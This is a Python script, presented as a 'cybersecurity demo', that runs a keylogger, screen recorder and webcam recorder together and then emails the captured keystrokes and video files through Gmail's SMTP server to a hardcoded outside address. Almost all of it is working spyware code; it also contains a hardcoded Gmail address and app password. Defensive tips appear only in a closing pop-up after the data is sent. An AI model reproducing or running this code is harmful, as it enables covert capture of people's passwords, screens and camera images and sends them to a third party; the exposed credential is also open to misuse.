import threading
import time
import cv2
import pyautogui
import numpy as np
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import tkinter as tk
from tkinter import messagebox

# --- Settings ---
KEY_LOG_FILE = "keys.txt"
SCREEN_FILE = "screen.avi"
CAMERA_FILE = "camera.avi"

SENDER_EMAIL = "worksproject193@gmail.com"
SENDER_PASSWORD = "ljyy oiss vvqb svqr"   # Gmail App Password
RECEIVER_EMAIL = "muditchahar8@gmail.com"

running = True   # global flag to stop threads

# --- Keylogger ---
def keylogger():
    with open(KEY_LOG_FILE, "w") as f:
        f.write("Keylogs with Timestamps\n")

    def on_press(key):
        if not running:
            return False
        with open(KEY_LOG_FILE, "a") as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            try:
                f.write(f"{timestamp} : {key.char}\n")
            except AttributeError:
                f.write(f"{timestamp} : [{key}]\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Screen Recorder ---
def screen_recorder(filename=SCREEN_FILE, frame_rate=8.0):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(filename, fourcc, frame_rate, screen_size)

    while running:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()

# --- Camera Recorder ---
def camera_recorder(filename=CAMERA_FILE, frame_rate=8.0):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(filename, fourcc, frame_rate,
                          (int(cap.get(3)), int(cap.get(4))))
    while running:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()

# --- Email Sending ---
def send_email(files):
    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = "Cybersecurity Demo: Captured Files"
    msg.attach(MIMEText("This is a demo of spyware exfiltration.", "plain"))

    for file in files:
        try:
            with open(file, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={file}")
            msg.attach(part)
        except FileNotFoundError:
            print(f"[WARNING] File not found, skipping: {file}")

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print("[INFO] Email sent successfully!")
    except Exception as e:
        print("[ERROR] Email sending failed:", e)

# --- Defense Awareness ---
def defense_awareness():
    tips = """
    ⚠️ ALERT: This demo simulated spyware activities.
    Your data was 'captured' locally.

    ✅ Countermeasures:
    - Use antivirus & anti-malware software
    - Restrict camera/mic permissions
    - Monitor running processes
    - Use firewalls & IDS/IPS
    - Avoid installing unknown software
    """
    print(tips)
    root = tk.Tk()
    root.withdraw()
    messagebox.showwarning("Cybersecurity Awareness", tips)

# --- Main ---
if __name__ == "__main__":
    t1 = threading.Thread(target=keylogger)
    t2 = threading.Thread(target=screen_recorder)
    t3 = threading.Thread(target=camera_recorder)

    print("[INFO] Demo started. Press Ctrl + C to stop...")
    t1.start()
    t2.start()
    t3.start()

    try:
        while True:
            time.sleep(1)  # keep main thread alive
    except KeyboardInterrupt:
        print("\n[INFO] Stopping all threads...")
        running = False
        t1.join()
        t2.join()
        t3.join()

        print("[INFO] Sending captured files via email...")
        try:
            send_email([KEY_LOG_FILE, SCREEN_FILE, CAMERA_FILE])
        except KeyboardInterrupt:
            print("\n[WARNING] Email sending was interrupted by user.")

        defense_awareness()
        print("[INFO] Demo finished.")